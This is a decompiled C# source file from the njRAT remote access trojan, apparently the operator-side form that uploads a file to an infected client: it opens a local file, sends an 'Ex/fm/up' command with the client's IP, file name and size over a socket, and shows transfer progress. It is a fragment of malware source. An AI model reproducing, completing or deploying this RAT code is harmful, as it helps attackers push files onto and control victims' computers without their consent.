using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using NJRAT.NJRAT;

namespace NJRAT
{
	// Token: 0x02000027 RID: 39
	[DesignerGenerated]
	public partial class up : Form
	{
		// Token: 0x06000549 RID: 1353 RVA: 0x00174FD0 File Offset: 0x001733D0
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = up.__ENCList;
			lock (_ENCList)
			{
				bool flag = up.__ENCList.Count == up.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = up.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = up.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								up.__ENCList[num] = up.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					up.__ENCList.RemoveRange(num, up.__ENCList.Count - num);
					up.__ENCList.Capacity = up.__ENCList.Count;
				}
				up.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x170001DD RID: 477
		// (get) Token: 0x0600054C RID: 1356 RVA: 0x00175528 File Offset: 0x00173928
		// (set) Token: 0x0600054D RID: 1357 RVA: 0x00175540 File Offset: 0x00173940
		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		// Token: 0x170001DE RID: 478
		// (get) Token: 0x0600054E RID: 1358 RVA: 0x0017554C File Offset: 0x0017394C
		// (set) Token: 0x0600054F RID: 1359 RVA: 0x00175564 File Offset: 0x00173964
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= eventHandler;
				}
				this._Button1 = value;
				flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click += eventHandler;
				}
			}
		}

		// Token: 0x170001DF RID: 479
		// (get) Token: 0x06000550 RID: 1360 RVA: 0x001755C4 File Offset: 0x001739C4
		// (set) Token: 0x06000551 RID: 1361 RVA: 0x001755DC File Offset: 0x001739DC
		internal virtual GClass9 Lv1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Lv1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Lv1 = value;
			}
		}

		// Token: 0x170001E0 RID: 480
		// (get) Token: 0x06000552 RID: 1362 RVA: 0x001755E8 File Offset: 0x001739E8
		// (set) Token: 0x06000553 RID: 1363 RVA: 0x00175600 File Offset: 0x00173A00
		internal virtual Timer vmethod_4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._vmethod_4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.vmethod_4_Tick);
				bool flag = this._vmethod_4 != null;
				if (flag)
				{
					this._vmethod_4.Tick -= eventHandler;
				}
				this._vmethod_4 = value;
				flag = this._vmethod_4 != null;
				if (flag)
				{
					this._vmethod_4.Tick += eventHandler;
				}
			}
		}

		// Token: 0x170001E1 RID: 481
		// (get) Token: 0x06000554 RID: 1364 RVA: 0x00175660 File Offset: 0x00173A60
		// (set) Token: 0x06000555 RID: 1365 RVA: 0x00175678 File Offset: 0x00173A78
		internal virtual ColumnHeader ColumnHeader1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader1 = value;
			}
		}

		// Token: 0x170001E2 RID: 482
		// (get) Token: 0x06000556 RID: 1366 RVA: 0x00175684 File Offset: 0x00173A84
		// (set) Token: 0x06000557 RID: 1367 RVA: 0x0017569C File Offset: 0x00173A9C
		internal virtual ColumnHeader ColumnHeader2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader2 = value;
			}
		}

		// Token: 0x06000558 RID: 1368 RVA: 0x001756A8 File Offset: 0x00173AA8
		public up()
		{
			base.FormClosing += this.up_FormClosing;
			base.Load += this.up_Load;
			up.__ENCAddToList(this);
			this.Closinge = false;
			this.os = 0;
			this.InitializeComponent();
		}

		// Token: 0x06000559 RID: 1369 RVA: 0x00175704 File Offset: 0x00173B04
		private void Button1_Click(object sender, EventArgs e)
		{
			this.Close();
		}

		// Token: 0x0600055A RID: 1370 RVA: 0x00175710 File Offset: 0x00173B10
		private void up_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.Closinge = true;
			try
			{
				this.FS.Close();
				this.FS.Dispose();
			}
			catch (Exception ex)
			{
			}
			try
			{
				this.sk.Close();
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x0600055B RID: 1371 RVA: 0x0017578C File Offset: 0x00173B8C
		private void up_Load(object sender, EventArgs e)
		{
			this.FS = new FileStream(this.TMP, FileMode.Open);
			this.Lv1.Items[0].SubItems[0].Text = new FileInfo(this.TMP).Name;
			this.Lv1.Items[1].SubItems[0].Text = Class6.smethod_17((long)this.SZ);
			this.Lv1.Items[2].SubItems[0].Text = Class6.smethod_17(0L);
			this.Lv1.Items[3].SubItems[0].Text = Class6.smethod_17(0L);
			this.ProgressBar1.Maximum = this.SZ;
			this.osk.Send(string.Concat(new string[]
			{
				"Ex",
				Class7.string_1,
				"fm",
				Class7.string_1,
				"up",
				Class7.string_1,
				this.osk.ip(),
				Class7.string_1,
				Class6.smethod_14(ref this.FN),
				Class7.string_1,
				Conversions.ToString(this.SZ)
			}));
			this.Lv1.method_3();
			this.vmethod_4.Enabled = true;
		}

		// Token: 0x0600055C RID: 1372 RVA: 0x0017591C File Offset: 0x00173D1C
		private void vmethod_4_Tick(object sender, EventArgs e)
		{
			try
			{
				this.Lv1.Items[2].SubItems[1].Text = Class6.smethod_17((long)(this.ProgressBar1.Value - this.os));
				this.os = this.ProgressBar1.Value;
				this.Lv1.Items[3].SubItems[1].Text = Class6.smethod_17((long)this.ProgressBar1.Value);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x04000279 RID: 633
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x0400027B RID: 635
		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		// Token: 0x0400027C RID: 636
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x0400027D RID: 637
		[AccessedThroughProperty("Lv1")]
		private GClass9 _Lv1;

		// Token: 0x0400027E RID: 638
		[AccessedThroughProperty("vmethod_4")]
		private Timer _vmethod_4;

		// Token: 0x0400027F RID: 639
		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader _ColumnHeader1;

		// Token: 0x04000280 RID: 640
		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader _ColumnHeader2;

		// Token: 0x04000281 RID: 641
		public bool Closinge;

		// Token: 0x04000282 RID: 642
		public string FN;

		// Token: 0x04000283 RID: 643
		public FileStream FS;

		// Token: 0x04000284 RID: 644
		public int os;

		// Token: 0x04000285 RID: 645
		public Client osk;

		// Token: 0x04000286 RID: 646
		public Client sk;

		// Token: 0x04000287 RID: 647
		public int SZ;

		// Token: 0x04000288 RID: 648
		public string TMP;
	}
}
